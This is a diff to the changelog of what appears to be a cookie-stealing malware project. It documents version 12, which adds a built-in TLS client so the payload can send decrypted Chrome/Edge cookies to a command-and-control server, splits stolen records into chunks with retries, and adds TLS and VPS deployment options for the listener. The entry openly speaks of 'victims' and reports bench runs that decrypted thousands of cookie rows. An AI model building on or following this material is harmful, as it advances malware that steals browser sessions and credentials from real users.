@@ -3,7 +3,49 @@
 
 ## What's New
 
-### v11 -- v20 key stage folded into the loader (current)
+### v12 -- TLS C2 in the payload, chunked delivery (current)
+
+**The payload speaks TLS without a proxy.** `https://` in the C2 slot now selects
+a schannel 1.2 client inside `ckdll.dll`: raw Winsock connect, `SCHANNEL_CRED`
+with manual validation, `InitializeSecurityContext`, `EncryptMessage` per write,
+`close_notify` on close. The server chain and hostname are checked with
+`CertGetCertificateChain` + `CertVerifyCertificateChainPolicy(CERT_CHAIN_POLICY_SSL)`
+against the system roots, so a Caddy/Let's Encrypt endpoint validates on a stock
+victim; no request is sent when it fails. `secur32.dll` is preloaded with the
+other system DLLs and linked in both build scripts.
+
+**A caller-owned token buffer, because SspiCli's allocator fails.** On this bench
+the first `InitializeSecurityContextA` returned `SEC_E_INSUFFICIENT_MEMORY`
+(`GetLastError` 1450) before producing a byte; the Negotiate package failed the
+same way, so it is the runtime allocator, not the TLS flags. Passing a 64 KB
+caller buffer returns a 171-byte ClientHello. The payload now owns every output
+token and never calls `FreeContextBuffer` for them. (curl uses caller buffers
+for the same reason.)
+
+**Chunked delivery on record boundaries.** Records are serialised once and their
+offsets kept; each POST carries at most 600 records or 384 KB, truncated only
+between records. Every chunk is a complete `{"records":[...]}` envelope, tagged
+`X-CookieLog-Chunk: i/n`; only the last carries `coverage`. Each chunk is retried
+4 times (500 / 1000 / 2000 ms) and is only counted as delivered when the listener
+answers `HTTP/1.x 200` -- for TLS the response record is decrypted before the
+status line is read. A stalled chunk costs that chunk, not the dump.
+
+**Listener TLS and deployment.** `listen.py --tls-cert <pem> --tls-key <pem>`
+wraps each connection in the worker thread (TLS 1.2 minimum), so a direct TLS
+listener no longer needs Caddy. `c2auth`/`auto` accept `https://`, default to
+port 443, and skip the local plain listener when the C2 is a remote TLS endpoint.
+`deploy/vps/bootstrap.sh` keeps the production shape (Caddy terminates TLS,
+listener on loopback); `--plain` is now explicitly the legacy plain-HTTP path
+and actually binds `0.0.0.0`.
+
+**Bench.** Full TLS handshake against a local CA, six chunks, `200` per chunk,
+listener wrote coverage run `r18728` at 3,574 rows / 3,573 decrypted. Release
+payload rebuilt (58,880 bytes, `secur32` imported, no debug strings), release
+run over plain HTTP wrote run `r14976` with the same totals; 24 tests pass. The
+real `DecryptData` success still needs an elevated host with Chrome/Edge, as in
+v11.
+
+### v11 -- v20 key stage folded into the loader
 
 **One payload, one key stage.** `loader.exe` now embeds `ckdec.exe` as RCDATA
 and, when its own token is elevated, runs the Chrome/Edge app-bound key stage
